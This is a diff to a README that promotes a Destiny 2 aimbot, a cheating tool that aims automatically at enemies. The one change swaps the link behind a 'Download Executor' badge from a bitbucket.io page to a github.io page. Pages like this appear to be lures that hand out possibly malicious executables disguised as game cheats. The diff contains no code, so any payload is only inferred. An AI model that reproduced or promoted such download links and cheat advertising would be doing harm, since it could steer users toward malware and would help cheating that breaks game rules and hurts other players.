@@ -2,7 +2,7 @@
 
 In Destiny 2, an aimbot is a tool designed to enhance a player's aiming capabilities by automatically aligning the crosshair with enemy targets. This technology ensures precise shots, giving players a competitive edge in fast-paced matches.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Executor-blueviolet)](https://fileoffload3.bitbucket.io/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Executor-blueviolet)](https://Destiny-2-Aimbot-zuzi.github.io/.github)
 ---
 
 ## 🛠️ Key Features
